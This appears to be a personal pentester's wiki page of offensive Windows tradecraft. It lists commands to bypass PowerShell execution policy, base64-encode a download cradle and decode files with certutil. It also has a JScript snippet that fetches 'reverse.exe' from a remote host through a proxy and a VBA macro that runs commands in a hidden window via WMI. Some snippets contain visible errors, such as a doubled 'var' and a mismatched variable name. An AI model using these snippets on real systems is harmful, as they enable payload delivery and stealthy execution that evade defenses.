---
title: "Misc"
date: 2025-10-03
draft: false
type: wiki
---

# Enable execution of PowerShell Scripts

```console
Set-ExecutionPolicy RemoteSigned
Set-ExecutionPolicy Unrestricted
powershell.exe -exec bypass
```

-----------------------------

# Encode Powershell b64 from Linux

```console
echo 'ImAnEviCradleBuuhhhh' | iconv -t UTF-16LE | base64 -w0
```

-----------------------------

# Encode/Decode b64 in Windows WITHOUT Powershell

```console
certutil -encode <inputfile> <outputfile>
certutil -decode <b64inputfile> <plainoutputdecodedfile>
  ^-- If the file exists I can use the -f flag which will force an overwrite
```

-----------------------------

# Set Proxy in code used (Windows)

## Powershell

```console
[System.Net.WebRequest]::DefaultWebProxy.GetProxy(url)
```

## JScript

```console
var url = "http://192.168.42.43/reverse.exe";
var var Object = new ActiveXObject("MSXML2.ServerXMLHTTP.6.0");
Object.setProxy("2","192.168.42.42:3128");
Object.open('GET', url, false);
Object.send();
  ^-- This was tricky because lack of debug information. The parameter in "2" means "SXH_PROXY_SET_PROXY", and it allows to specify a list of one or more servers together with a bypass list. The .open() must be in lowercase otherwise .Open() is another method
```

-----------------------------

# Hide Foreground with WMI (Windows, Office Macros)

```console
Sub example()
  Const HIDDEN_WINDOW = 0
  Dim cmd As String

  cmd = "Here there is some commands to execute inside the macro via WMI"
  Set objWMIService = GetObject("winmgmts:")
  Set objStartup = objWMIService.Get("Win32_ProcessStartup")
  Set objConfig = objStartup.SpawnInstance_
  objConfig.ShowWindow = HIDDEN_WINDOW
  Set objProcess = GetObject("winmgmts:Win32_Process")
  errReturn = objProcess.Create(str, Null, objConfig, pid)
End Sub
```

-----------------------------
